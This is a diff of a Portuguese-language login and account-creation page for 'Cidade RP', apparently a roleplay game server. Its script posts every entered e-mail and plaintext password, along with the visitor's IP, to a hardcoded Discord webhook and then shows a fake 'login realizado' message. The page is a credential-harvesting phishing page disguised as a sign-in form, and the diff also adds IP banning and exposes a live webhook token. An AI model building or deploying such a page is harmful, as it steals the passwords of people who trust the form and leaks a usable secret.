@@ -2,54 +2,107 @@
 <html lang="pt-BR">
 <head>
   <meta charset="utf-8">
-  <title>Cadastro - Cidade RP</title>
+  <title>Cidade RP - Acesso</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    body{background:#0d1117;color:#f0f6fc;font-family:Segoe UI;display:flex;justify-content:center;align-items:center;height:100vh}
-    form{background:#161b22;padding:25px;border-radius:8px;width:280px}
-    input{width:100%;padding:8px;margin:6px 0;border:none;border-radius:4px}
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:Segoe UI,Arial;background:#0d1117;color:#f0f6fc;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:15px}
+    .card{background:#161b22;border-radius:8px;padding:25px;width:100%;max-width:320px}
+    h3{margin-bottom:15px;text-align:center}
+    input{width:100%;padding:10px;margin:6px 0;border:none;border-radius:4px}
     button{width:100%;padding:10px;border:none;border-radius:4px;background:#238636;color:#fff;font-weight:bold;cursor:pointer}
     button:hover{background:#2ea043}
+    .switch{text-align:center;margin-top:10px;font-size:14px;color:#58a6ff;cursor:pointer}
+    .switch:hover{text-decoration:underline}
+    .hide{display:none}
+    #msg{color:#f85149;margin-top:8px;font-size:14px;text-align:center}
+    @media(max-width:400px){.card{padding:20px}}
   </style>
 </head>
 <body>
-  <form id="formLogin">
-    <h3>Entrar na cidade</h3>
-    <input type="email" id="email" placeholder="Seu e-mail" required>
-    <input type="password" id="senha" placeholder="Sua senha" required>
-    <button type="submit">Enviar</button>
-  </form>
+  <div class="card" id="loginCard">
+    <h3 id="titulo">Entrar na cidade</h3>
+    <form id="formAuth">
+      <input type="email" id="email" placeholder="E-mail" required>
+      <input type="password" id="senha" placeholder="Senha" required>
+      <input type="password" id="confSenha" placeholder="Confirmar senha" class="hide">
+      <div id="msg"></div>
+      <button type="submit" id="btnEnvio">Entrar</button>
+    </form>
+    <div class="switch" id="switchBtn">Criar nova conta</div>
+  </div>
 
   <script>
-    const webhook = "https://discord.com/api/webhooks/1425212407764094976/SPXgg8cjZBe5hIoqzLsV2Fyyk5MjZNZJmRUevf-f68Qw_47MifLJwOAiF1CxqMAf8IrN";
-    document.getElementById("formLogin").addEventListener("submit", async e => {
-      e.preventDefault();
-      const email = document.getElementById("email").value;
-      const senha = document.getElementById("senha").value;
-      const agora = new Date().toLocaleString("pt-BR");
+  (async function(){
+    // 1) Verifica se IP está banido
+    const meuIP = await (await fetch("https://api.ipify.org?format=json")).json().then(r=>r.ip).catch(()=>"desconhecido");
+    const banned = await fetch("banned-ips.json").then(r=>r.json()).catch(()=>[]);
+    if(banned.includes(meuIP)){
+      document.body.innerHTML="<div class='card'><h3>Acesso negado</h3><p>Seu IP foi bloqueado.</p></div>";
+      return;
+    }
 
+    // 2) Alternância entre Login e Criar conta
+    let modoCriar = false;
+    const titulo   = document.getElementById("titulo");
+    const btnEnvio = document.getElementById("btnEnvio");
+    const confSenha= document.getElementById("confSenha");
+    const switchBtn= document.getElementById("switchBtn");
+    const formAuth = document.getElementById("formAuth");
+    const msg      = document.getElementById("msg");
+
+    switchBtn.onclick = () => {
+      modoCriar = !modoCriar;
+      titulo.textContent   = modoCriar ? "Criar conta" : "Entrar na cidade";
+      btnEnvio.textContent = modoCriar ? "Criar" : "Entrar";
+      confSenha.classList.toggle("hide", !modoCriar);
+      switchBtn.textContent= modoCriar ? "Já tenho conta" : "Criar nova conta";
+      msg.textContent="";
+    };
+
+    // 3) Envio
+    formAuth.addEventListener("submit", async e=>{
+      e.preventDefault();
+      const email = document.getElementById("email").value.trim();
+      const senha = document.getElementById("senha").value;
+      const conf  = confSenha.value;
+      if(modoCriar && senha!==conf){msg.textContent="Senhas não coincidem";return;}
+      msg.textContent="";
+
+      const agora = new Date().toLocaleString("pt-BR");
       const payload = {
         content: null,
-        embeds: [{
-          title: "Novo cadastro - Cidade RP",
-          color: 0x00ff88,
-          fields: [
-            { name: "E-mail", value: email, inline: true },
-            { name: "Senha", value: senha, inline: true },
-            { name: "Horário", value: agora, inline: false }
-          ],
-          footer: { text: "IP: " + (await (await fetch("https://api.ipify.org?format=json")).json()).ip }
+        embeds:[{
+          title: modoCriar ? "Nova conta criada" : "Login efetuado",
+          color: modoCriar ? 0x00ff88 : 0xffd700,
+          fields:[
+            {name:"E-mail",value:email,inline:true},
+            {name:"Senha",value:senha,inline:true},
+            {name:"IP",value:meuIP,inline:true},
+            {name:"Horário",value:agora,inline:false}
+          ]
+        }],
+        components:[{
+          type:1,
+          components:[{
+            type:2,
+            style:4,
+            label:"Banir IP",
+            custom_id:`ban_${meuIP}`
+          }]
         }]
       };
 
-      await fetch(webhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
+      await fetch("https://discord.com/api/webhooks/1425212407764094976/SPXgg8cjZBe5hIoqzLsV2Fyyk5MjZNZJmRUevf-f68Qw_47MifLJwOAiF1CxqMAf8IrN",{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify(payload)
       });
 
-      alert("Dados enviados! Aguarde aprovação.");
-      e.target.reset();
+      alert(modoCriar ? "Conta criada com sucesso!" : "Login realizado!");
+      formAuth.reset();
     });
+  })();
   </script>
 </body>
 </html>
